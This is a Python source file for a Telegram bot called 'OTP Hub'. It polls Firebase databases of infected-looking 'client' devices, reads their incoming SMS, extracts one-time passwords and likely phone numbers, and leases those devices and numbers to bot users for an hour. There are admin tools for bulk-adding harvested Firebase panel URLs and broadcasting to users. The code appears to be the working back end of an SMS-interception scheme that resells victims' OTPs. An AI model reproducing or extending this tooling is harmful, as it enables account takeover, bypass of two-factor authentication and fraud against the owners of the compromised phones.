import asyncio, os, time, logging, random
from aiohttp import web
from aiogram import Bot, Dispatcher, F, Router
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, CopyTextButton
from aiogram.filters import Command, CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.exceptions import TelegramBadRequest

import database as db
import firebase_utils as fbu

logging.basicConfig(level=logging.INFO)
log = logging.getLogger("OTP-Bot")

BOT_TOKEN = os.getenv("BOT_TOKEN", "")
OWNER_ID = 8480878371
PORT = int(os.getenv("PORT", 8080))

router = Router()
running_bots = {}
active_scans = {}

class AdminStates(StatesGroup):
    add_url = State()
    add_bulk_urls = State()
    add_bot = State()
    add_admin = State()
    broadcast = State()

async def get_owner_stats():
    data = db.load_data()
    fbs = data.get("firebases", [])
    
    async def fetch_single_fb(fb):
        clients = await fbu.fetch_fb(f"{fb['url']}/clients.json", fb.get("auth"))
        fb_online = 0
        fb_total = 0
        if clients and isinstance(clients, dict):
            fb_total = len(clients)
            for dev_id, dev_data in clients.items():
                if isinstance(dev_data, dict) and dev_data.get("status") is True:
                    fb_online += 1
        return fb, fb_online, fb_total

    tasks = [fetch_single_fb(fb) for fb in fbs]
    results = await asyncio.gather(*tasks)
    
    total_devices, online_devices = 0, 0
    stats_list = []
    for fb, online, total in results:
        stats_list.append({"fb": fb, "online": online, "total": total})
        total_devices += total
        online_devices += online
    return total_devices, online_devices, stats_list

async def send_otp_to_user(uid, service, otp, msg_text):
    otp_msg = (
        f"🔔 <b>OTP Received!</b>\n\n"
        f"📱 <b>Service:</b> {service}\n"
        f"🔑 <b>OTP:</b> {otp}\n\n"
        f"💬 <b>Msg:</b> {msg_text[:100]}..."
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=f"📋 {otp}", copy_text=CopyTextButton(text=otp))]])
    try:
        bot = running_bots.get(BOT_TOKEN)
        if bot: await bot.send_message(uid, otp_msg, reply_markup=kb, parse_mode="HTML")
    except Exception: pass

async def get_latest_messages_for_fb(fb_url, auth):
    all_msgs = {}
    clients = await fbu.fetch_fb(f"{fb_url}/clients.json", auth)
    if not clients: return all_msgs
    for dev_id in clients.keys():
        msgs = await fbu.fetch_fb(f"{fb_url}/messages/{dev_id}.json?orderBy=%22%24key%22&limitToLast=5", auth)
        if msgs:
            for k, v in msgs.items():
                if isinstance(v, dict) and v.get("type") == "incoming":
                    if int(v.get("id", 0)) > all_msgs.get(dev_id, {}).get("id", 0):
                        all_msgs[dev_id] = v
    return all_msgs

async def background_scanner():
    log.info("Global Scanner Started...")
    while True:
        try:
            data = db.load_data()
            fbs = data.get("firebases", [])
            leases = data.get("user_leases", {})
            
            device_to_users = {}
            current_time = time.time()
            for uid, lease in leases.items():
                if current_time < lease["expire_at"] and "dev_id" in lease:
                    device_to_users.setdefault(lease["dev_id"], []).append(uid)
            
            if device_to_users:
                for fb in fbs:
                    latest_msgs = await get_latest_messages_for_fb(fb["url"], fb.get("auth"))
                    for dev_id, msg in latest_msgs.items():
                        key = (fb["url"], dev_id)
                        msg_id = int(msg.get("id", 0))
                        old_id = active_scans.get(key, 0)
                        if msg_id > old_id:
                            active_scans[key] = msg_id
                            if old_id != 0: 
                                text_content = msg.get("message", "")
                                otp = fbu.extract_otp(text_content)
                                if otp and dev_id in device_to_users:
                                    service = fbu.extract_service_name(text_content, msg.get("sender", ""))
                                    for uid in device_to_users[dev_id]:
                                        await send_otp_to_user(uid, service, otp, text_content)
            await asyncio.sleep(3)
        except Exception as e:
            log.error(f"Scanner Error: {e}")
            await asyncio.sleep(5)

def main_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📱 Get Number", callback_data="user:get_num")],
        [InlineKeyboardButton(text="⭐ My Numbers", callback_data="user:my_numbers")]
    ])

def admin_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="👤 Enter as User", callback_data="user:home")],
        [InlineKeyboardButton(text="🔥 Manage Servers", callback_data="admin:manage_fb"), InlineKeyboardButton(text="🤖 Manage Bots", callback_data="admin:bots")],
        [InlineKeyboardButton(text="👥 Manage Admins", callback_data="admin:admins"), InlineKeyboardButton(text="📢 Broadcast", callback_data="admin:broadcast")],
        [InlineKeyboardButton(text="🔄 Refresh Panel", callback_data="admin:home")]
    ])

@router.message(CommandStart())
async def cmd_start(msg: Message):
    data = db.load_data()
    uid = msg.from_user.id
    if str(uid) not in data["users"]:
        data["users"][str(uid)] = {"name": msg.from_user.full_name, "joined": int(time.time()), "starred": {}}
        db.save_data(data)
    
    if uid == data["owner_id"] or uid in data.get("admins", []):
        try: await msg.answer("⏳ <i>Loading analytics...</i>", parse_mode="HTML")
        except TelegramBadRequest: pass
        await admin_home_msg(msg)
    else:
        if not data.get("free_mode", True): return await msg.answer("⛔ Access Denied.")
        await msg.answer("👋 <b>Welcome to OTP Hub!</b>\nSelect an option:", reply_markup=main_kb(), parse_mode="HTML")

async def admin_home_msg(msg: Message):
    total, online, stats_list = await get_owner_stats()
    text = (
        f"👑 <b>Owner Analytics Dashboard</b>\n\n"
        f"🔥 <b>Total Servers:</b> {len(stats_list)}\n"
        f"📱 <b>Total Devices:</b> {total}\n"
        f"🟢 <b>Online Devices:</b> {online}\n"
        f"👥 <b>Total Users:</b> {len(db.load_data().get('users', {}))}\n\n"
        f"<b>Servers List:</b>\n"
    )
    for i, stat in enumerate(stats_list):
        fb = stat["fb"]
        text += f"📁 <b>{fb['label']}</b> | Base {i+1}\n🔗 <code>{fb['url']}</code>\n└ {stat['online']} ON / {stat['total']} Total\n\n"
    try: await msg.answer(text, reply_markup=admin_kb(), parse_mode="HTML")
    except TelegramBadRequest: pass

@router.callback_query(F.data == "admin:home")
async def admin_home_cb(cq: CallbackQuery):
    try: await cq.message.edit_text("🔄 Refreshing live analytics...")
    except TelegramBadRequest: pass
    await admin_home_msg(cq.message)

@router.callback_query(F.data == "admin:manage_fb")
async def admin_manage_fb(cq: CallbackQuery):
    data = db.load_data()
    fbs = data.get("firebases", [])
    if not fbs: 
        kb = [[InlineKeyboardButton(text="➕ Add URL", callback_data="admin:add_url")], [InlineKeyboardButton(text="🔙 Back", callback_data="admin:home")]]
        return await cq.message.edit_text("No servers added yet.", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb))
    
    kb = []
    for i, fb in enumerate(fbs):
        kb.append([
            InlineKeyboardButton(text=f"📁 Base {i+1} | {fb['label']}", callback_data=f"admin:viewfb:{i}"),
            InlineKeyboardButton(text="❌", callback_data=f"admin:rmfb:{i}")
        ])
    
    kb.append([InlineKeyboardButton(text="➕ Add URL", callback_data="admin:add_url"), InlineKeyboardButton(text="📁 Bulk Add", callback_data="admin:add_bulk")])
    kb.append([InlineKeyboardButton(text="🔙 Back", callback_data="admin:home")])
    
    try: await cq.message.edit_text("Manage Servers:", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb))
    except TelegramBadRequest: pass

@router.callback_query(F.data == "admin:add_url")
async def admin_add_url_start(cq: CallbackQuery, state: FSMContext):
    await state.set_state(AdminStates.add_url)
    await cq.message.edit_text("Send URL in this format:\n<code>URL | Country</code>\nExample:\n<code>https://xyz.firebaseio.com | India</code>", parse_mode="HTML")

@router.message(AdminStates.add_url)
async def admin_add_url_done(msg: Message, state: FSMContext):
    await state.clear()
    data = db.load_data()
    text = msg.text.strip()
    if "|" not in text:
        return await msg.answer("❌ Invalid format. Use <code>URL | Country</code>", parse_mode="HTML")
    parts = text.split("|")
    url = parts[0].strip()
    label = parts[1].strip()
    
    if url.startswith("http"):
        if "#DARKs=" in url or "?s=" in url:
            decoded = fbu.decode_panel_url(url)
            if decoded: url = decoded[0]
            
        if "http" in label or "rtdb" in label or "firebase" in label:
            label = "India"
            
        data["firebases"].append({"url": url, "label": label, "auth": ""})
        db.save_data(data)
        await msg.answer(f"✅ Server added for {label}!", reply_markup=admin_kb())
    else:
        await msg.answer("❌ URL must start with http")

@router.callback_query(F.data == "admin:add_bulk")
async def admin_add_bulk_start(cq: CallbackQuery, state: FSMContext):
    await state.set_state(AdminStates.add_bulk_urls)
    await cq.message.edit_text("Send URLs in this format:\n<code>URL | Country</code> (one per line)", parse_mode="HTML")

@router.message(AdminStates.add_bulk_urls)
async def admin_add_bulk_done(msg: Message, state: FSMContext):
    await state.clear()
    data = db.load_data()
    added = 0
    for line in msg.text.strip().split("\n"):
        if "|" in line:
            parts = line.split("|")
            url = parts[0].strip()
            label = parts[1].strip()
            if url.startswith("http"):
                if "#DARKs=" in url or "?s=" in url:
                    decoded = fbu.decode_panel_url(url)
                    if decoded: url = decoded[0]
                
                if "http" in label or "rtdb" in label or "firebase" in label:
                    label = "India"
                    
                data["firebases"].append({"url": url, "label": label, "auth": ""})
                added += 1
    db.save_data(data)
    await msg.answer(f"✅ Added {added} servers successfully!", reply_markup=admin_kb())

@router.callback_query(F.data.startswith("admin:rmfb:"))
async def admin_rmfb(cq: CallbackQuery):
    idx = int(cq.data.split(":")[2])
    data = db.load_data()
    if 0 <= idx < len(data["firebases"]):
        del data["firebases"][idx]
        db.save_data(data)
    await cq.answer("✅ Removed!")
    await admin_manage_fb(cq)

@router.callback_query(F.data.startswith("admin:viewfb:"))
async def admin_viewfb(cq: CallbackQuery):
    idx = int(cq.data.split(":")[2])
    data = db.load_data()
    fb = data["firebases"][idx]
    try: await cq.message.edit_text("🔄 Fetching online devices...")
    except TelegramBadRequest: pass
    
    clients = await fbu.fetch_fb(f"{fb['url']}/clients.json", fb.get("auth"))
    if not clients: return await cq.message.edit_text("❌ No devices found.", reply_markup=admin_kb())
    
    text = f"📁 <b>Base {idx+1}:</b> {fb['label']}\n🔗 <b>URL:</b> <code>{fb['url']}</code>\n\n"
    count = 0
    for dev_id, dev_info in clients.items():
        if isinstance(dev_info, dict) and dev_info.get("status") is True:
            battery = str(dev_info.get("battery", "100")).replace("%", "")
            text += f"🆔 <code>{dev_id}</code> | 🟢 {battery}%\n"
            count += 1
            if count >= 15: break
            
    if count == 0: text += "No online devices currently."
        
    kb = [[InlineKeyboardButton(text="🔙 Back", callback_data="admin:manage_fb")]]
    try: await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")
    except TelegramBadRequest: pass

@router.callback_query(F.data == "admin:bots")
async def admin_bots(cq: CallbackQuery):
    data = db.load_data()
    tokens = data.get("extra_tokens", [])
    text = f"🤖 <b>Manage Bots</b>\n\nMain Bot: Active\nExtra Bots: {len(tokens)}\n\nUse <code>/add_bot &lt;token&gt;</code> to add a new bot."
    kb = [[InlineKeyboardButton(text="🔙 Back", callback_data="admin:home")]]
    try: await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")
    except TelegramBadRequest: pass

@router.message(Command("add_bot"))
async def cmd_add_bot(msg: Message):
    if msg.from_user.id != OWNER_ID: return
    parts = msg.text.split()
    if len(parts) != 2: return await msg.answer("Usage: <code>/add_bot &lt;token&gt;</code>", parse_mode="HTML")
    new_token = parts[1]
    
    data = db.load_data()
    if new_token not in data.setdefault("extra_tokens", []):
        data["extra_tokens"].append(new_token)
        db.save_data(data)
        
    if new_token not in running_bots:
        await start_bot_instance(new_token)
        await msg.answer("✅ Bot added and started in background!")
    else:
        await msg.answer("⚠️ Bot is already running.")

async def start_bot_instance(token: str):
    bot = Bot(token=token)
    dp = Dispatcher(storage=MemoryStorage())
    dp.include_router(router)
    running_bots[token] = bot
    asyncio.create_task(dp.start_polling(bot))

@router.callback_query(F.data == "admin:admins")
async def admin_admins(cq: CallbackQuery):
    data = db.load_data()
    admins = data.get("admins", [])
    text = f"👥 <b>Manage Admins</b>\n\nCurrent Admins: {len(admins)}\n\nUse <code>/add_admin &lt;user_id&gt;</code> to add a new admin."
    kb = [[InlineKeyboardButton(text="🔙 Back", callback_data="admin:home")]]
    try: await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")
    except TelegramBadRequest: pass

@router.message(Command("add_admin"))
async def cmd_add_admin(msg: Message):
    if msg.from_user.id != OWNER_ID: return
    parts = msg.text.split()
    if len(parts) != 2: return await msg.answer("Usage: <code>/add_admin &lt;user_id&gt;</code>", parse_mode="HTML")
    new_admin = int(parts[1])
    
    data = db.load_data()
    if new_admin not in data.setdefault("admins", []):
        data["admins"].append(new_admin)
        db.save_data(data)
        await msg.answer("✅ Admin added successfully!")
    else:
        await msg.answer("⚠️ User is already an admin.")

@router.callback_query(F.data == "admin:broadcast")
async def admin_broadcast(cq: CallbackQuery, state: FSMContext):
    await state.set_state(AdminStates.broadcast)
    await cq.message.edit_text("Send the message you want to broadcast to all users:")

@router.message(AdminStates.broadcast)
async def admin_broadcast_done(msg: Message, state: FSMContext):
    await state.clear()
    data = db.load_data()
    users = list(data.get("users", {}).keys())
    success = 0
    for uid in users:
        try:
            bot = running_bots.get(BOT_TOKEN)
            if bot:
                await bot.copy_message(chat_id=int(uid), from_chat_id=msg.chat.id, message_id=msg.message_id)
                success += 1
                await asyncio.sleep(0.05)
        except Exception: pass
    await msg.answer(f"✅ Broadcast sent to {success} users!", reply_markup=admin_kb())

# ================= USER FLOW =================

@router.callback_query(F.data == "user:home")
async def user_home(cq: CallbackQuery):
    try: await cq.message.edit_text("👋 <b>Welcome!</b>\nSelect an option:", reply_markup=main_kb(), parse_mode="HTML")
    except TelegramBadRequest: pass

@router.callback_query(F.data == "user:get_num")
async def user_get_num(cq: CallbackQuery):
    data = db.load_data()
    fb_countries = list(set([fb["label"] for fb in data.get("firebases", [])]))
    all_countries = sorted(fb_countries)
    kb = []
    for c in all_countries:
        kb.append([InlineKeyboardButton(text=f"🏳️ {c}", callback_data=f"country:{c}")])
    kb.append([InlineKeyboardButton(text="🏠 Main Menu", callback_data="user:home")])
    try: await cq.message.edit_text("🌍 <b>Select a Country:</b>", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")
    except TelegramBadRequest: pass

@router.callback_query(F.data.startswith("country:"))
async def user_country_selected(cq: CallbackQuery):
    country = cq.data.split(":")[1]
    data = db.load_data()
    fbs = [fb for fb in data.get("firebases", []) if fb["label"].lower() == country.lower()]
    kb = []
    for i, fb in enumerate(fbs):
        kb.append([InlineKeyboardButton(text=f"📁 Base {i+1}", callback_data=f"server:fb:{country}:{i}")])
    kb.append([InlineKeyboardButton(text="🔙 Back", callback_data="user:get_num")])
    try: await cq.message.edit_text(f"🌍 {country} - Select a Server:", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")
    except TelegramBadRequest: pass

@router.callback_query(F.data.startswith("server:fb:"))
async def user_fb_server(cq: CallbackQuery):
    parts = cq.data.split(":")
    country = parts[2]
    idx = int(parts[3])
    uid = cq.from_user.id
    data = db.load_data()
    
    fbs = [fb for fb in data.get("firebases", []) if fb["label"].lower() == country.lower()]
    if idx >= len(fbs): return await cq.answer("Server not found.")
    fb = fbs[idx]
    
    try: await cq.message.edit_text("🔄 Fetching devices...")
    except TelegramBadRequest: pass
    
    # Get online devices
    clients = await fbu.fetch_fb(f"{fb['url']}/clients.json", fb.get("auth"))
    if not clients: return await cq.answer("❌ No devices online on this Server.", show_alert=True)
    
    online_devices = [dev_id for dev_id, d in clients.items() if isinstance(d, dict) and d.get("status") is True]
    if not online_devices: return await cq.answer("❌ All devices are offline.", show_alert=True)
    
    # 24h Device Tracking
    used = data.setdefault("used_devices", {}).setdefault(str(uid), {}).setdefault(country, {})
    now = int(time.time())
    used = {k: v for k, v in used.items() if now - v < 86400} # Clean 24h old
    data["used_devices"][str(uid)][country] = used
    
    available_devices = [d for d in online_devices if d not in used]
    
    if not available_devices:
        kb = [
            [InlineKeyboardButton(text="🔄 Try Another Server", callback_data=f"country:{country}")],
            [InlineKeyboardButton(text="🏠 Main Menu", callback_data="user:home")]
        ]
        return await cq.message.edit_text("❌ <b>All devices used in this Server!</b>\nTry another Server for new number or wait 24h.", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")
        
    dev_id = random.choice(available_devices)
    
    # Mark as used
    used[dev_id] = now
    
    dev_data = clients[dev_id]
    
    # Deep SMS History for Number Extraction
    url = f"{fb['url']}/messages/{dev_id}.json?orderBy=%22%24key%22&limitToLast=300"
    msgs_dict = await fbu.fetch_fb(url, fb.get("auth"))
    msgs = [v for k, v in msgs_dict.items() if isinstance(v, dict) and v.get("type") == "incoming"] if msgs_dict else []
    
    best_nums = fbu.extract_best_numbers(dev_data, msgs)
    
    # Clear old lease to prevent mixing OTPs
    data["user_leases"].pop(str(uid), None)
    
    data["user_leases"][str(uid)] = {
        "dev_id": dev_id, "fb_url": fb["url"], "country": country, "numbers": [n for n, c in best_nums],
        "expire_at": int(time.time()) + 3600
    }
    db.save_data(data)
    
    nums_text = ""
    kb_nums = []
    if best_nums:
        for n, c in best_nums:
            nums_text += f"📞 <code>+91{n}</code> ({c}% chance)\n"
            kb_nums.append([InlineKeyboardButton(text=f"📋 Copy +91{n}", copy_text=CopyTextButton(text=f"+91{n}"))])
    else:
        nums_text = "⚠️ <b>SIM active hai, OTP aane par number update ho jayega.</b>"
        
    battery = str(dev_data.get("battery", "100")).replace("%", "")
    if not battery or battery == "?": battery = "100"
    
    text = (
        f"📱 <b>Numbers Received</b>\n"
        f"🔥 Server: {fb['label']} (Base {idx+1})\n"
        f"🆔 Rent Code: <code>{dev_id}</code>\n"
        f"⚙️ Code: <code>{battery}T</code>\n\n"
        f"{nums_text}\n"
        f"⌛ <i>Waiting for OTP (1 Hour)...</i>"
    )
    
    kb = kb_nums + [
        [InlineKeyboardButton(text="📋 Copy Rent ID", copy_text=CopyTextButton(text=dev_id))],
        [InlineKeyboardButton(text="⭐ Save to My Numbers", callback_data=f"star:{dev_id}")],
        [InlineKeyboardButton(text="🔄 Refresh OTP", callback_data=f"refresh_otp:{dev_id}"), InlineKeyboardButton(text="⏹ Stop", callback_data="stop_listen")],
        [InlineKeyboardButton(text="🔙 Back", callback_data=f"country:{country}")]
    ]
    try: await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")
    except TelegramBadRequest: pass

@router.callback_query(F.data.startswith("refresh_otp:"))
async def refresh_otp(cq: CallbackQuery):
    dev_id = cq.data.split(":")[1]
    uid = cq.from_user.id
    data = db.load_data()
    lease = data["user_leases"].get(str(uid))
    if lease and lease.get("dev_id") == dev_id:
        lease["expire_at"] = int(time.time()) + 3600
        db.save_data(data)
        await cq.answer("✅ OTP Listening refreshed for 1 Hour!")
    else:
        await cq.answer("❌ Lease expired or invalid.", show_alert=True)

@router.callback_query(F.data == "stop_listen")
async def stop_listening(cq: CallbackQuery):
    uid = cq.from_user.id
    data = db.load_data()
    if str(uid) in data["user_leases"]:
        del data["user_leases"][str(uid)]
        db.save_data(data)
        await cq.answer("⏹ Listening stopped successfully.", show_alert=True)
    else:
        await cq.answer("No active listening found.", show_alert=True)
    await user_home(cq)

@router.callback_query(F.data.startswith("star:"))
async def star_device(cq: CallbackQuery):
    dev_id = cq.data.split(":")[1]
    uid = cq.from_user.id
    data = db.load_data()
    if str(uid) not in data["users"]: return await cq.answer("User not found!")
    starred = data["users"][str(uid)].setdefault("starred", {})
    if dev_id in starred:
        del starred[dev_id]
        await cq.answer("❌ Removed from My Numbers!")
    else:
        lease = data["user_leases"].get(str(uid), {})
        starred[dev_id] = {"numbers": lease.get("numbers", []), "country": lease.get("country", "Unknown")}
        await cq.answer("⭐ Saved to My Numbers!")
    db.save_data(data)

@router.callback_query(F.data == "user:my_numbers")
async def user_my_numbers(cq: CallbackQuery):
    uid = cq.from_user.id
    data = db.load_data()
    starred = data["users"].get(str(uid), {}).get("starred", {})
    if not starred:
        kb = [[InlineKeyboardButton(text="🏠 Main Menu", callback_data="user:home")]]
        return await cq.message.edit_text("⭐ <b>My Numbers</b>\n\nNo saved numbers yet.", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")
    text = "⭐ <b>My Numbers</b>\n\nTap to re-access OTPs:\n"
    kb = []
    for dev_id, info in starred.items():
        kb.append([
            InlineKeyboardButton(text=f"🆔 {dev_id}", callback_data=f"access:{dev_id}"),
            InlineKeyboardButton(text="🗑 Remove", callback_data=f"star:{dev_id}")
        ])
    kb.append([InlineKeyboardButton(text="🏠 Main Menu", callback_data="user:home")])
    try: await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")
    except TelegramBadRequest: pass

@router.callback_query(F.data.startswith("access:"))
async def access_saved_device(cq: CallbackQuery):
    dev_id = cq.data.split(":")[1]
    uid = cq.from_user.id
    data = db.load_data()
    starred = data["users"].get(str(uid), {}).get("starred", {})
    if dev_id not in starred: return await cq.answer("Device not saved!")
    is_online = False
    for fb in data.get("firebases", []):
        clients = await fbu.fetch_fb(f"{fb['url']}/clients.json", fb.get("auth"))
        if clients and dev_id in clients:
            if clients[dev_id].get("status") is True: is_online = True
            break
    if not is_online: return await cq.answer("❌ Not in range pls try again after some time", show_alert=True)
    
    info = starred[dev_id]
    
    data["user_leases"].pop(str(uid), None)
    
    data["user_leases"][str(uid)] = {
        "numbers": info["numbers"], "country": info["country"], "dev_id": dev_id, "expire_at": int(time.time()) + 3600
    }
    db.save_data(data)
    
    nums_text = ""
    kb_nums = []
    if info["numbers"]:
        for n in info["numbers"]:
            nums_text += f"📞 <code>+91{n}</code>\n"
            kb_nums.append([InlineKeyboardButton(text=f"📋 Copy +91{n}", copy_text=CopyTextButton(text=f"+91{n}"))])
    else:
        nums_text = "⚠️ <b>SIM active hai, OTP aane par number update ho jayega.</b>"
        
    text = (
        f"📱 <b>Re-Accessed Device</b>\n"
        f"🆔 <b>Rent Code:</b> <code>{dev_id}</code>\n\n"
        f"{nums_text}\n\n"
        f"⌛ <i>Waiting for OTP (1 Hour)...</i>"
    )
    
    kb = kb_nums + [
        [InlineKeyboardButton(text="📋 Copy Rent ID", copy_text=CopyTextButton(text=dev_id))],
        [InlineKeyboardButton(text="🔄 Refresh OTP", callback_data=f"refresh_otp:{dev_id}"), InlineKeyboardButton(text="⏹ Stop", callback_data="stop_listen")],
        [InlineKeyboardButton(text="🏠 Main Menu", callback_data="user:home")]
    ]
    try: await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")
    except TelegramBadRequest: pass

async def main():
    log.info("Bot Started!")
    app = web.Application()
    app.router.add_get('/', lambda r: web.Response(text="Bot is running!"))
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', PORT)
    await site.start()
    main_bot = Bot(token=BOT_TOKEN)
    running_bots[BOT_TOKEN] = main_bot
    asyncio.create_task(background_scanner())
    dp = Dispatcher(storage=MemoryStorage())
    dp.include_router(router)
    await dp.start_polling(main_bot)

if __name__ == "__main__":
    asyncio.run(main())
